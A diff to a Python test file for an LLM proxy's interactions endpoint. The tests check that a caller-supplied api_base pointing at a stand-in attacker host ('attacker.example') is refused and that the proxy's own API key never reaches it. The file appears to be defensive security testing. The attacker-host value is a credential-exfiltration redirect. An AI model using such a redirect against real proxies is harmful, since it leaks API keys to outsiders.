@@ -242,13 +242,54 @@ def test_non_admin_reads_a_session_with_their_own_key(user_client):
     assert session.calls.last.request.headers["x-api-key"] == "sk-ant-caller"
 
 
-def test_non_admin_cannot_point_the_default_provider_at_another_api_base_with_the_proxy_key(user_client):
+EVIL_API_BASE = "https://attacker.example"
+
+
+@pytest.mark.parametrize("client_fixture", ["interactions_client", "user_client"])
+def test_api_base_in_the_template_is_refused_without_the_admin_opt_in(request, client_fixture: str):
     import respx
 
+    client = request.getfixturevalue(client_fixture)
+    template = _template(api_key="k", api_base=EVIL_API_BASE)
+    with respx.mock:
+        evil = respx.route(host="attacker.example")
+        response = client.get(f"/v1beta/interactions/{SESSION_ID}?litellm_params_template={template}")
+
+    assert response.status_code == 400
+    assert "allow_client_side_credentials" in response.json()["detail"]["error"]
+    assert not evil.called
+
+
+def test_admin_opt_in_lets_a_caller_key_follow_its_own_api_base(user_client, monkeypatch: pytest.MonkeyPatch):
+    import respx
+    from httpx import Response
+
+    from litellm.proxy import proxy_server
+
+    monkeypatch.setattr(proxy_server, "general_settings", {"allow_client_side_credentials": True})
+    own_base = "https://claude.internal.example"
+    template = _template(custom_llm_provider="anthropic", api_key="sk-ant-caller", api_base=own_base)
+    with respx.mock:
+        session = respx.get(f"{own_base}/v1/sessions/{SESSION_ID}").mock(
+            return_value=Response(200, json=_anthropic_session())
+        )
+        respx.get(f"{own_base}/v1/sessions/{SESSION_ID}/events").mock(return_value=Response(200, json=_idle_events()))
+        response = user_client.get(f"/v1beta/interactions/{SESSION_ID}?litellm_params_template={template}")
+
+    assert response.status_code == 200
+    assert session.calls.last.request.headers["x-api-key"] == "sk-ant-caller"
+
+
+def test_admin_opt_in_still_keeps_the_proxy_key_off_a_non_admin_api_base(user_client, monkeypatch: pytest.MonkeyPatch):
+    import respx
+
+    from litellm.proxy import proxy_server
+
+    monkeypatch.setattr(proxy_server, "general_settings", {"allow_client_side_credentials": True})
     with respx.mock:
         evil = respx.route(host="attacker.example")
         response = user_client.get(
-            f"/v1beta/interactions/{SESSION_ID}?litellm_params_template={_template(api_base='https://attacker.example')}"
+            f"/v1beta/interactions/{SESSION_ID}?litellm_params_template={_template(api_base=EVIL_API_BASE)}"
         )
 
     assert response.status_code == 401
